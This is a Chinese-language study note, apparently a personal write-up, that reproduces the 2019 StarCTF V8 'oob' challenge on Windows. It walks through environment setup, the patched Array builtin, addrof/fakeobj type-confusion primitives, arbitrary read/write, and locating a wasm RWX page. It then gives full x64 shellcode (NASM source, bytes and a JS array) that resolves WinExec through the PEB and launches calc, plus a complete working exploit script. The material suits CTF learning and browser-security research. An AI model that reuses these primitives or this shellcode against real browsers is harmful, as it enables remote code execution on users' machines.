
> [!note] 
> 总体利用思路：
> 1 获取任意地址读写——类型混淆
> 2 将shellcode写入执行
>    *2022前低版本直接写入wasm的RWX地址，高版本引入堆沙箱需要绕过
> 

## 1 环境配置

### 1.1 v8下载

https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-maglev/#setting-up-the-v8-debugging-environment

https://github.com/v8/v8

Depot Tools 是一套脚本和工具的集合，旨在管理 Chromium 相关项目的开发工作流程。这些工具有助于获取源代码、管理依赖项、构建项目和运行测试。其中一些工具包括用于同步依赖项的_gclient 、用于构建的__ninja_和用于项目生成的_gn 。

配置gclient

```bash
gclient
fetch v8
cd v8
git checkout 5315f073233429c5f5c2c794594499debda307bd

#conda activate python27

gclient sync -D

#x64.release x64.debug
#gm
python tools\dev\gm.py x64.release
out\x64.release\d8.exe -maglev --allow-natives-syntax
load('D:\\Phoexina\\Browser\\expjs\\pwn.js')

#v8gen.py
python tools\dev\v8gen.py x64.release
ninja -C ./out.gn/x64.release
out.gn\x64.release\d8.exe D:\Phoexina\Browser\expjs\test.js

./d8 -maglev --allow-natives-syntax /d/Phoexina/Browser/expjs/test3.js


#检查commit版本对应的发布版本
git tag --contains 7f22404388ef0eb9383f189c1b0a85b5ea93b079
```

### 1.2 Win调试
古早版本VS 2017 

> VS 2017
> 免费社区版：
> https://download.microsoft.com/download/9/D/2/9D228A37-56C0-48D7-B1B4-486090DE7C2A/vs_Community.exe
> 专业版：
> https://download.microsoft.com/download/0/C/3/0C3F5C94-40C4-4BF4-8D18-BEEAF47AE687/vs_Professional.exe
> 企业版：
> https://download.microsoft.com/download/4/2/9/429C6D6F-543E-4BB4-A2C7-4EFA7F8DE59D/vs_Enterprise.exe
> 生成工具：
> https://download.visualstudio.microsoft.com/download/pr/3e542575-929e-4297-b6c6-bef34d0ee648/639c868e1219c651793aff537a1d3b77/vs_buildtools.exe
> 


| windbg cmd         |                        |     |
| :----------------- | :--------------------- | :-- |
| dps 0xaaaa         | 输出数据，指针形式，8位一行，中间有个`   |     |
| dd 0xaaaa          | 输出数据，双指针形式，4位 4位 4位 4位 |     |
| db 0xaaaa          | 输出数据，ascii码            |     |
| bp 0xaaaa          | 断点                     |     |
| x kernel32!WinExec | 在某模块查函数地址              |     |
| x *!WinExec        | 在所有模块查函数地址             |     |


### 1.3 模拟实际

历史版本下载
https://vikyd.github.io/download-chromium-history-version/#/

chromium

https://chromium.googlesource.com/chromium/src/+/115.0.5790.170
https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/1287751/
官方下载网络不是很稳定，也不能用IDM

chrome
https://downzen.com/en/windows/google-chrome/versions
https://github.com/ulixee/chrome-versions


正式版本利用
https://www.cnblogs.com/confidant/p/15379856.html
## 2 oob：模拟理解v8利用逻辑

> 2019 StarCTF oob
> 参考：
> https://github.com/vngkv123/aSiagaming/blob/master/Chrome-v8-oob/README.md
> https://bbs.kanxue.com/thread-268933.htm

diff文件不知道为什么只能用看雪下载的才行，难道diff文件名必须也一样？

```bash
git apply D:\Phoexina\Browser\ctf\test.diff
#重新编译
python tools\dev\v8gen.py x64.release
ninja -C ./out.gn/x64.release

cd ./out.gn/x64.release
d8.exe D:\Phoexina\Browser\expjs\test.js
```

### 2.1 理解oob()

理解一下修改的js代码

```c
BUILTIN(ArrayOob){
    uint32_t len = args.length();
    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    //至少有this，最多支持两个参数

    Handle<JSReceiver> receiver;
    //ASSIGN_RETURN_FAILURE_ON_EXCEPTION: 这是一个宏，用于在调用 `ToObject` 时进行错误处理，确保如果发生异常，函数将返回错误，而不是继续执行。
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    //将 `receiver` 转换为 `JSArray`（JavaScript 数组），因该内置方法主要处理数组。
    
    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    uint32_t length = static_cast<uint32_t>(array->length()->Number());
    //elements是数组元素，length是数组实际长度

    //只有this参数时，array.oob()
    if(len == 1){
        //read
        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
        //elements.get_scalar(length): 在 `elements` 数组中获取指定位置的值。它使用了数组长度作为索引。
		//NewNumber: 创建一个包含该值的新 `Number` 对象，返回给调用者。
		//如果只有一个参数（`this`），它会将数组转换为，`FixedDoubleArray`然后返回位于的元素`array[length]`
    }else{
        //write
        Handle<Object> value;
        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
        elements.set(length,value->Number());
        //如果有两个参数（`this`和`value`），它将`value`以浮点数形式写入`array[length]`
        return ReadOnlyRoots(isolate).undefined_value();
```

总之这个函数可以在读或写`array[length]`，这个位置对于数组一定是越界的

windbg会打开一个cmd，这里是d8的窗口
windbg这边负责断点之类的

![](../images/Pasted%20image%2020250417150431.png)
运行时可以随时break（这不就是gdb界面版吗，要是命令行也能放进去就更好了，不过可能是考虑存在界面程序吧）

根据讲解
这里地址使用的时候需要-1
第一个地址对应于该数组的`Map`。第二个地址对应于该数组的`properties`。第三个地址对应于该数组的`element`
于是获取第三个地址详细看

![](../images/Pasted%20image%2020250417151659.png)

可以看到，这个地址下面就是a里面的两个数
![](../images/Pasted%20image%2020250417153306.png)
这个`xxxxx14f9`表示FixedDoubleArray？
`0x0000000200000000`是一个`Smi`，它对应于`FixedDoubleArray`的长度（在本例中为 2，因为记住，`Smi`将是`value << 32`

![](../images/Pasted%20image%2020250417152932.png)

调用一下oob()，原解析这里使用了自定义的函数ftoi帮助输出，我们也可以导入一下
![](../images/Pasted%20image%2020250417154333.png)

可以看到这个就是Map

### 2.2 利用oob()

这里自己理解一下，oob()相当于可以修改数组的map地址，似乎这个东西定义了这个到底是个什么类型的map

> [!note] 
> 这里跳步骤了所以后面理解起来很痛苦x
> 简单来说就是：
> 全局变量，数据区在map定义的上方，所以数据的溢出一位就正好是map
> 这是oob()能改map的原理 

于是创建了一个obj对象，再创建一个obj的数组。
通过oob把它的map改成一个float数组的map，这个obj的数组就会以float数组的形式显示。

![](../images/Pasted%20image%2020250417160152.png)

于是可以创造两个函数
获取任意obj的内存地址：把obj放入obj_arr，转换成float数组输出obj位置
任意地址变成obj：把地址放入float_arr，转换成obj_arr，获取里面的obj

之后利用这两个函数创造出一个任意地址写
然后通过导入wasm创造出一个执行代码段，往这个地址写入shellcode

### 2.3 在win上复现

到这里我们大概知道用了一个这个东西，就可以接到shellcode
（在win上再复现不出来就要去配linux环境了x）
![](../images/Pasted%20image%2020250508160030.png)
在win上跑一下原linux上的解可以看到，反汇编界面走到输出的RWX Wasm page addr位置报错
具体看了一下反汇编的内容和js中的shellcode是一样的

那么是不是把这个linux的shellcode改成win的就可以
结果发现我原来写的是x32的xx只好再写一个

总之写好了放在另一个里面导入是没问题的

```cpp
unsigned char shellcodecalc64[] =  
        "\xBA\x98\xFE\x8A\x0E\xE8\x22\x00\x00\x00\x68\x63\x61\x6C\x63\x59\x51\x48\x89\xE1"  
        "\x48\x31\xD2\x48\xFF\xC2\xFF\xD0\xBA\x7E\xD8\xE2\x73\xE8\x06\x00\x00\x00\x48\x31"  
        "\xC9\xFF\xD0\xC3\x65\x4C\x8B\x04\x25\x60\x00\x00\x00\x49\x8B\x78\x18\x48\x8B\x7F"  
        "\x30\x48\x31\xC9\x48\x8B\x47\x10\x48\x8B\x77\x40\x48\x8B\x3F\x66\x39\x4E\x18\x75"  
        "\xEF\x48\x89\xC7\x8B\x5F\x3C\x81\xC3\x88\x00\x00\x00\x48\x01\xFB\x8B\x03\x48\x89"  
        "\xFB\x48\x01\xC3\x8B\x43\x20\x49\x89\xF8\x49\x01\xC0\x8B\x4B\x18\xFF\xC9\x41\x8B"  
        "\x04\x88\x48\x89\xFE\x48\x01\xC6\x4D\x31\xC9\x48\x31\xC0\xFC\xAC\x84\xC0\x74\x09"  
        "\x41\xC1\xC9\x0D\x49\x01\xC1\xEB\xF2\x41\x39\xD1\x90\x75\xD9\x44\x8B\x43\x24\x49"  
        "\x01\xF8\x66\x41\x8B\x04\x48\x44\x8B\x43\x1C\x4D\x8D\x04\x38\x41\x8B\x04\x80\x48"  
        "\x01\xF8\xC3";

```


复刻到shellcode后先遇到了这个，显然0000的没有显示出来，怪不得解的shellcode有两串90
![](../images/Pasted%20image%2020250508145832.png)

添加90后又遇到了，没截图（

```
(5494.8260): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. KERNELBASE!CreateProcessInternalA+0x9d: 00007ffa`210b945d 0f298424c0000000 movaps xmmword ptr [rsp+0C0h],xmm0 ss:00000022`d6bfec18=00000000000000000000000000000000
```

gpt解析
![](../images/Pasted%20image%2020250508160956.png)

emmmm反正感觉不太对，但是说和rsp有关系，就想到了 那个栈对齐的问题

![](../images/Pasted%20image%2020250508161058.png)

好的，但是我总不能每次都对栈-不同的数吧
于是在最前面添加了一段栈对齐的判断

asm如下：
locate_funcs就是在从头找函数
nasm编译的global里面只能call（不懂为什么

```asm
section .text  
  
global start  
start:  
    nop  
    call main  
    ret  
  
  
main:  
    test    rsp, 8          ; 只检测最低4位里的8位是否被置位  
    jz      aligned         ; 如果不是8，就是正好对齐或其它，直接走aligned  
    sub     rsp, 0x8       ; 需要补0x8字节对齐  
aligned:  
    sub     rsp, 0x10       ; 已对齐或4字节倍数，只补一点  
  
    mov     edx, 0x0e8afe98  
    call    locate_funcs  
    ; --call_winexec--  
    push    0x636C6163           ; 'calc'  
    pop     rcx  
    push    rcx  
    mov     rcx, rsp  
    xor     rdx, rdx  
    inc     rdx  
    sub     rsp, 0x28  
    call    rax  
  
    mov     edx, 0x73e2d87e  
    call    locate_funcs  
    xor     rcx, rcx  
    call    rax  
    ret  
  
  
locate_funcs:  
    mov     r8,  [gs:0x60]  
    mov     rdi, [r8+0x18]  
    mov     rdi, [rdi+0x30]  
    xor     rcx, rcx  
    ;mov     dl, 0x4b  
; --next_module--  
next_module_loop:  
    mov     rax, [rdi+0x10]       ;dll的基址  
    mov     rsi, [rdi+0x40]  
    mov     rdi, [rdi]  
    cmp     [rsi+0x18], cx        ;查找Kernel32.dll  
    jne     next_module_loop      ; was: 0x75, 0xae (relative -0x52)  
    ; was: 0xe9,0x14,0x03,0x00,0x00 (relative jump) jmp     lookup_func  
; --lookup_func--  
    mov     rdi, rax              ;++ rdi=rax=dll的基址  
    mov     ebx, [rdi+0x3c]  
    add     ebx, 0x88  
    add     rbx, rdi  
    mov     eax, [rbx]  
    mov     rbx, rdi  
    add     rbx, rax  
    mov     eax, [rbx+0x20]  
    mov     r8, rdi  
    add     r8, rax  
    mov     ecx, [rbx+0x18]       ;ecx = 导出函数数量  
  
; --check_names--  
check_names_loop:  
    dec     ecx  
    mov     eax, [r8 + rcx*4]  
    mov     rsi, rdi  
    add     rsi, rax  
    xor     r9, r9  
    xor     rax, rax  
    cld  
  
; --calc_hash--  
calc_hash_loop:  
    lodsb  
    test    al, al  
    je      calc_hash_finished  
    ror     r9d, 0x0d               ;哈希算法  
    add     r9, rax  
    jmp     calc_hash_loop  
  
; --calc_finished--  
calc_hash_finished:  
    cmp     r9d, edx  
    nop  
    jne     check_names_loop  
  
; --find_addr--  
    mov     r8d, [rbx+0x24]  
    add     r8, rdi  
    mov     ax, [r8 + rcx*2]  
    mov     r8d, [rbx+0x1c]  
    lea     r8, [r8 + rdi]  
    mov     eax, [r8 + rax*4]  
    add     rax, rdi  
  
; --found_func--  
    ret
```


最后的js版本：

```js
var shellcode = [
    0x90909090, 0x90909090,
    0x0001e890, 0x48c30000, 0x0008c4f7, 0x04740000, 0x08ec8348, 0x10ec8348, 0x8afe98ba, 0x0026e80e,
    0x63680000, 0x59636c61, 0xe1894851, 0x48d23148, 0x8348c2ff, 0xd0ff28ec, 0xe2d87eba, 0x0006e873,
    0x31480000, 0xc3d0ffc9, 0x048b4c65, 0x00006025, 0x788b4900, 0x7f8b4818, 0xc9314830, 0x10478b48,
    0x40778b48, 0x663f8b48, 0x75184e39, 0xc78948ef, 0x813c5f8b, 0x000088c3, 0xfb014800, 0x8948038b,
    0xc30148fb, 0x4920438b, 0x0149f889, 0x184b8bc0, 0x8b41c9ff, 0x89488804, 0xc60148fe, 0x48c9314d,
    0xacfcc031, 0x0974c084, 0x0dc9c141, 0xebc10149, 0xd13941f2, 0x44d97590, 0x4924438b, 0x4166f801,
    0x4448048b, 0x4d1c438b, 0x4138048d, 0x4880048b, 0x90c3f801,
  ];
```


终于成功了！

![](../images/Pasted%20image%2020250508155608.png)


转换用到的py：

```python
'''  
input格式：  
8B 04 90  
01 E8  
AB  
58  
3D 6A 0A 38 1E  
75 A0  
31 DB  
'''  
  
  
def get_hex_array(file_path):  
    result = []  
    with open(file_path, 'r') as file:  
        for line in file:  
            hex_values = line.strip().split()  
            result.extend(hex_values)  # 合并为一维列表  
    # 转为0x前缀、全小写格式  
    hex_array = [f"{val.upper()}" for val in result]  
    print(hex_array)  
    return hex_array  
  
def print_combined_string(hex_values):  
    combined_string = ''.join(f'\\x{value}' for value in hex_values)  
    # 每行最多 10 个 \xXX    output_lines = []  
    for i in range(0, len(combined_string), 80):  # 每行 20 个字符（10 个 \xXX）  
        output_lines.append(f'"{combined_string[i:i + 80]}"')  # 用双引号包围  
  
    formatted_output = '\n'.join(output_lines)  
    print(formatted_output)    
  
def hex_to_js(hex_array):  
    # 补齐到4的倍数  
    while len(hex_array) % 4 != 0:  
        hex_array.append('90')  # 补NOP  
  
    results = []  
    for i in range(0, len(hex_array), 4):  
        chunk = hex_array[i:i+4]  
        # 小端顺序拼接（低位在前）  
        hexstr = ''.join(chunk[::-1])  
        # 转十六进制整数  
        results.append(f"0x{hexstr.lower()}")  
  
    print('var shellcode = [')  
    for i in range(0, len(results), 8):  
        print('  ' + ', '.join(results[i:i+8]) + ',')  
    print('];')  
  
  
# 使用示例  
if __name__ == "__main__":  
    file_path = 'file/input2.txt'  # 替换为你的文件路径  
    data = get_hex_array(file_path)  
    print_combined_string(data)  
    print("--------------------------------------------------------------")  
    hex_to_js(data)
```


### 2.4 理解wasm

如果不拷贝shellcode，这个打开的wasm是什么东西捏
就是下面这个
![](../images/Pasted%20image%2020250509110217.png)

首先从题解可以看到似乎是使用了WasmFiddle
这个以前是一个web上的编译器，现在已经没有了

于是下载了它的github仓想本地跑跑，结果原来只是一个ui界面（

但是我已经理解了，其实这里就是一个从c编译到wasm的过程
可以直接下载本地编译器

```shell
git clone https://github.com/emscripten-core/emsdk.git
cd emsdk
./emsdk install latest
./emsdk activate latest

# 根据提示
# echo 'source "/xxx/emsdk/emsdk_env.sh"' >> $HOME/.bash_profile
```

然后就可以编译了 `emcc hello.c -o hello.js`

写一个简单的c

```c
#include <stdio.h>
int main() {
  return 0;
}
```

可以看到有过程文件hello.wasm出现

```shell
node -e "a=Array.from(require('fs').readFileSync('hello.wasm'));console.log('var wasm_code = new Uint8Array([' + a.join(',') + ']);')"
```

但是非常长
![](../images/Pasted%20image%2020250509113332.png)

一个空函数都比题解的长的多，很显然不是题解利用的这个的生成方式
于是查到了还可以用.wat（.wast）直接生成.wasm

写一个easy.wat，编译 `wat2wasm easy.wat -o easy.wasm`

```wast
(module
  (func (export "add") (param i32 i32) (result i32)
    local.get 0
    local.get 1
    i32.add
  )
)
```

这一次输出很明显短的多了

![](../images/Pasted%20image%2020250509113801.png)

但是只替换会报错
![](../images/Pasted%20image%2020250509114002.png)

需要把函数名也换掉，因为这个函数不是main是add

```js
var f = wasm_instance.exports.add;
```

就可以弹出计算器了！

那么再缩减一下函数

下面这种不导出的不行
![](../images/Pasted%20image%2020250509114401.png)
可以空函数，但是必须导出

最后的wast：
```wast
(module
  (func (export "add"))
)
```

js的数组：
```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,7,1,3,97,100,100,0,0,10,4,1,2,0,11]);
```

wasm如果直接编译一个命令执行呢？

![](../images/Pasted%20image%2020250509152541.png)

试了一下，会报让我们import环境
![](../images/Pasted%20image%2020250513161351.png)

### 2.5 实现任意地址读

接 2.3，可以创造两个函数
获取任意obj的内存地址：把obj放入obj_arr，转换成float数组输出obj位置
任意地址变成obj：把地址放入float_arr，转换成obj_arr，获取里面的obj

```js
var temp_obj = {"A":1};
var obj_array = [temp_obj];
var flt_array = [1.1];
var obj_map = obj_array.oob();
var flt_map = flt_array.oob();

function addrof(in_obj) {
	obj_array[0] = in_obj;
	obj_array.oob(flt_map);
	let addr = obj_array[0];
	obj_array.oob(obj_map);
	return ftoi(addr);
}


function fakeobj(addr) {
	flt_array[0] = addr;
	flt_array.oob(obj_map);
	let fake = flt_array[0];
	flt_array.oob(flt_map);
	return fake;
}

```

这样就输出了地址

![](../images/Pasted%20image%2020250512095642.png)

根据之前的理解，这个是首地址，可以在里面找到元素地址
![](../images/Pasted%20image%2020250512100004.png)
进而找到实际第一个元素内容
![](../images/Pasted%20image%2020250512100036.png)

此时创建一个fake
![](../images/Pasted%20image%2020250512170551.png)

也就是第三个元素为 a的地址-0x20
![](../images/Pasted%20image%2020250512170643.png)

如果fake是一个float_map那么我们可以看到这个值
![](../images/Pasted%20image%2020250512170740.png)

应该是创造出来一个可以让fake变成float array的环境
于是我们希望fake：
第一行map
第二行？
第三行elements

(这个地方卡了好久，其实本质上是oob能够替换map的原理x)

终于理解了！这个floatarray存储的内容是是这样的：
假设有一个 `var a = [1.1, 1.2, 1.3, 1.4];`  地址输出是1c7f1e53dc9

需要注意这个数组必须定义在全局

```
000001c7`f1e53d78  ffffffff`00000000
000001c7`f1e53d80  0000030f`ef0c12c9
000001c7`f1e53d88  00000001`00000000
000001c7`f1e53d90  00000400`00000000
-------------------------------------------
Elements指针指向的数据区 000001c7`f1e53d99-1
000001c7`f1e53d98  0000030f`ef0c14f9
000001c7`f1e53da0  00000004`00000000
000001c7`f1e53da8  3ff19999`9999999a     1.1
000001c7`f1e53db0  3ff33333`33333333     1.2
000001c7`f1e53db8  3ff4cccc`cccccccd     1.3
000001c7`f1e53dc0  3ff66666`66666666     1.4
-------------------------------------------
首地址 1c7f1e53dc9-1
000001c7`f1e53dc8  00000064`1a542ed9     Map
000001c7`f1e53dd0  0000030f`ef0c0c71     Properties指针
000001c7`f1e53dd8  000001c7`f1e53d99     Elements指针
000001c7`f1e53de0  00000004`00000000     长度
000001c7`f1e53de8  0000030f`ef0c0941
000001c7`f1e53df0  00000016`43623a9a
```


那么我们希望模拟的情况是：
```
000001c7`f1e53d78  ffffffff`00000000
000001c7`f1e53d80  0000030f`ef0c12c9
000001c7`f1e53d88  00000001`00000000
000001c7`f1e53d90  00000400`00000000
-------------------------------------------
Elements指针指向的数据区 000001c7`f1e53d99-1
000001c7`f1e53d98  0000030f`ef0c14f9
000001c7`f1e53da0  00000004`00000000
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
fake首地址
000001c7`f1e53da8  00000064`1a542ed9     1.1 -----> float Map
000001c7`f1e53db0  3ff33333`33333333     1.2
000001c7`f1e53db8  3ff4cccc`cccccccd     1.3 -----> 希望读取的数组，指向下面(模拟)的内容
000001c7`f1e53dc0  3ff66666`66666666     1.4
-------------------------------------------
首地址 1c7f1e53dc9-1
000001c7`f1e53dc8  00000064`1a542ed9     Map
000001c7`f1e53dd0  0000030f`ef0c0c71     Properties指针
000001c7`f1e53dd8  000001c7`f1e53d99     Elements指针
000001c7`f1e53de0  00000004`00000000     长度
000001c7`f1e53de8  0000030f`ef0c0941
000001c7`f1e53df0  00000016`43623a9a

....
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
....
某数组地址 (目标数据-0x10)
000001c7`f1e53d98  0000030f`ef0c14f9
000001c7`f1e53da0  00000004`00000000
某数组地址+0x10
000001c7`f1e53da8  3ff19999`9999999a     目标数据
000001c7`f1e53db0  3ff33333`33333333     ...
000001c7`f1e53db8  3ff4cccc`cccccccd     ...
000001c7`f1e53dc0  3ff66666`66666666     ...
```


于是可以写一个函数测试
只有这个数组是全局变量时，上面才是数据区


```js
var arb_rw_arr1 = [flt_map, 1.2, itof(BigInt(addrof(temp_obj)) - 0x10n), 1.4];
console.log("fflt_array" + addrof(arb_rw_arr1).toString(16));

function test() {
	// var arb_rw_arr1 = [flt_map, 1.2, itof(BigInt(addrof(temp_obj)) - 0x10n), 1.4];
	// 如果在里面就不行了，可以自己试一下
    console.log("flt_array " + addrof(flt_array).toString(16));
    console.log("flt_map " + addrof(flt_map).toString(16));
    console.log("temp_obj " + addrof(temp_obj).toString(16));
    console.log("fflt_array[0] addr" + addrof(arb_rw_arr1[0]).toString(16));
    console.log("fflt_array[0] var" + ftoi(arb_rw_arr1[0]).toString(16));

  
    var fake = fakeobj(addrof(arb_rw_arr1) - 0x20n);
    console.log("fake" + addrof(fake).toString(16));
    console.log("fake[0] addr " + addrof(fake[0]).toString(16));
    console.log("fake[0]" + ftoi(fake[0]));
}
```


简化一下，`itof(BigInt(addrof(temp_obj)) - 0x10n)`本质是为了精准输出
为了理解原理可以随便输出一个

```js
var arb_rw_arr1 = [flt_map, 1.2, itof(addrof(temp_obj)), 1.4];
//这里必须做转换，不然数据保存的是000000
console.log("fflt_array" + addrof(arb_rw_arr1).toString(16));
console.log("temp_obj " + addrof(temp_obj).toString(16));

function test() {
    console.log("flt_map " + addrof(flt_map).toString(16));
    console.log("fflt_array[0] addr" + addrof(arb_rw_arr1[0]).toString(16));
    console.log("fflt_array[0] var" + ftoi(arb_rw_arr1[0]).toString(16));

    var fake = fakeobj(addrof(arb_rw_arr1) - 0x20n);
    console.log("fake " + addrof(fake).toString(16));
    console.log("fake[0]" + ftoi(fake[0]));
}
```

如果不转浮点数的报错：

![](../images/Pasted%20image%2020250513172259.png)


### 2.6 实现任意地址写

根据上文，可以简化一下这两个函数：

```js
var arb_rw_arr1 = [flt_map, 1.2, itof(addrof(temp_obj)), 1.4];
var fake_array = fakeobj(addrof(arb_rw_arr1) - 0x20n);


function arb_read(addr) {
    arb_rw_arr1[2] = itof(addr - 0x10n);
    return ftoi(fake_array[0]);
}

function initial_arb_write(addr, val) {
    arb_rw_arr1[2] = itof(addr - 0x10n);
    fake_array[0] = itof(val);
}
```

我猜那个-1+1是因为这些地址都是+1的状态，计算的时候习惯先-1，但是存储又要+回来

BigInt好像没有什么用，就去掉了（也许有特殊情况？

然后就是shellcode写入了
理解一下dataview

大概是一个数据结构会往里面存的地址写入东西
我们直接把这个写入地址改成我们想写shellcode的地址
就可以直接用dataview的功能写入多个字符了！

最终脚本：

```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);


function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var temp_obj = {"A":1};
var obj_array = [temp_obj];
var flt_array = [1.1];
var obj_map = obj_array.oob();
var flt_map = flt_array.oob();

function addrof(in_obj) {
    obj_array[0] = in_obj;
    obj_array.oob(flt_map);
    let addr = obj_array[0];
    obj_array.oob(obj_map);
    return ftoi(addr);
}

function fakeobj(addr) {
    flt_array[0] = itof(addr);
    flt_array.oob(obj_map);
    let fake = flt_array[0];
    flt_array.oob(flt_map);
    return fake;
}

  
var arb_rw_arr1 = [flt_map, 1.2, itof(addrof(temp_obj)), 1.4];
var fake_array = fakeobj(addrof(arb_rw_arr1) - 0x20n);

function test() {
    console.log("fflt_array" + addrof(arb_rw_arr1).toString(16));
    console.log("temp_obj " + addrof(temp_obj).toString(16));
    console.log("flt_map " + addrof(flt_map).toString(16));

    var fake = fakeobj(addrof(arb_rw_arr1) - 0x20n);
    console.log("fake " + addrof(fake).toString(16));
    console.log("fake[0]" + ftoi(fake[0]));
}

function arb_read(addr) {
    arb_rw_arr1[2] = itof(addr - 0x10n);
    return ftoi(fake_array[0]);
}


function initial_arb_write(addr, val) {
    arb_rw_arr1[2] = itof(addr - 0x10n);
    fake_array[0] = itof(val);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,7,1,3,97,100,100,0,0,10,4,1,2,0,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.add;

  
var rwx_page_addr = arb_read(addrof(wasm_instance)+0x88n);
console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));

function copy_shellcode(addr, shellcode) {
    let buf0 = new ArrayBuffer(0x100);
    let dataview = new DataView(buf0);
    let buf_addr = addrof(buf0);
    console.log("[+] buf_addr: 0x" + buf_addr.toString(16));
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint32(4*i, shellcode[i], true);
    }

}

  

var shellcode = [
    0x90909090, 0x90909090,
    0x0001e890, 0x48c30000, 0x0008c4f7, 0x04740000, 0x08ec8348, 0x10ec8348, 0x8afe98ba, 0x0026e80e,
    0x63680000, 0x59636c61, 0xe1894851, 0x48d23148, 0x8348c2ff, 0xd0ff28ec, 0xe2d87eba, 0x0006e873,
    0x31480000, 0xc3d0ffc9, 0x048b4c65, 0x00006025, 0x788b4900, 0x7f8b4818, 0xc9314830, 0x10478b48,
    0x40778b48, 0x663f8b48, 0x75184e39, 0xc78948ef, 0x813c5f8b, 0x000088c3, 0xfb014800, 0x8948038b,
    0xc30148fb, 0x4920438b, 0x0149f889, 0x184b8bc0, 0x8b41c9ff, 0x89488804, 0xc60148fe, 0x48c9314d,
    0xacfcc031, 0x0974c084, 0x0dc9c141, 0xebc10149, 0xd13941f2, 0x44d97590, 0x4924438b, 0x4166f801,
    0x4448048b, 0x4d1c438b, 0x4138048d, 0x4880048b, 0x90c3f801,
  ];

console.log("[+] Copying xcalc shellcode to RWX page");
copy_shellcode(rwx_page_addr, shellcode);
let inputx = readline();
console.log("[+] Popping calc");

f();

```


## 3 ezv8：绕过堆沙箱写入wasm地址

> [!note] 
> 参考：
> https://d0ublew.github.io/writeups/bi0s-2024/pwn/ezv8-revenge/index.html 


todo

